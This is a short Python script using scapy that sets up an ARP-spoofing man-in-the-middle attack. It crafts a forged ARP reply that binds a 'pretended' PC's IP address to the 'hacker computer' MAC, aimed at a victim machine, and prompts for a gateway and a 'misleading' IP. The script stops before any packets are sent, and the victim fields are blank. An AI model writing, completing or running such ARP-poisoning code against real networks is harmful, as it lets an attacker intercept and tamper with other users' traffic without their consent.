from scapy.all import *
import os

'''
Man in the middle
source ip : 192.168.1.108

'''

ls(ARP)

op=2 # ARP response
hw_src = '08:97:98:CD:F6:90' # Hardware MAC address (Hacker computer)
p_src = '192.168.1.102' # Pretented PC
hw_dst = '' # Victim PC MAC address
p_dst = '' # Victim PC LAN address

arp_packet = ARP(op=op,
                 hwsrc=hw_src,
                 psrc=p_src,
                 hwdst=hw_dst,
                 pdst=p_dst
                 )
ether_packet = Ether(dst=hw_dst)
gateway_ipv4 = input('Gateway IPv4 : ')
misleading_ip = input('Misleading IPv4 : ')
